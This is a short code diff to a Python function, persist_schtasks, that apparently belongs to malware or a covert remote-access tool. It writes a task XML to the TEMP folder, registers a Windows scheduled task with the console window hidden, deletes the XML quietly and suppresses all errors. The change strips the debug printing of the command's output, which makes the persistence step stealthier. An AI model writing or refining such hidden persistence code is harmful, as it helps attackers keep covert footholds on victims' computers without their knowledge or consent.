@@ -264,9 +264,7 @@ def persist_schtasks():
         xml_path = os.path.join(os.getenv('TEMP'), 'pp.xml')
         open(xml_path, 'w', encoding='utf-16').write(xml.strip())
         cmd = f'schtasks /create /tn "{task_name}" /xml "{xml_path}" /f'
-        output=subprocess.run(cmd, shell=True, capture_output=True, text=True, creationflags=0x08000000)
-        print(output.stdout)
-        print(output.stderr)
+        subprocess.run(cmd, shell=True, capture_output=True, text=True, creationflags=0x08000000)
         os.system(f'powershell remove-item -path "{xml_path}" -force -erroraction silentlycontinue')
     except:
         pass
